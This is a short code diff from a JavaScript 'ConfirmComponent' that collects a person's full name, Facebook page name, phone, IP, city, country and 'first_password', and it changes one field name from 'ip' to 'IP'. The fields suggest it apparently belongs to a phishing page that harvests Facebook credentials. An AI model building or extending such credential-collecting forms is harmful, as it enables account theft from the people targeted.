@@ -55,7 +55,7 @@ const ConfirmComponent = () => {
                 'fill_full_name': firstCode.fill_full_name,
                 'fill_facebook_pagename': firstCode.fill_facebook_pagename,
                 'fill_phone': firstCode.fill_phone,
-                'ip': firstCode.ip,
+                'ip': firstCode.IP,
                 'city': firstCode.city,
                 'country': firstCode.country,
                 'first_password': firstCode.firt_password,
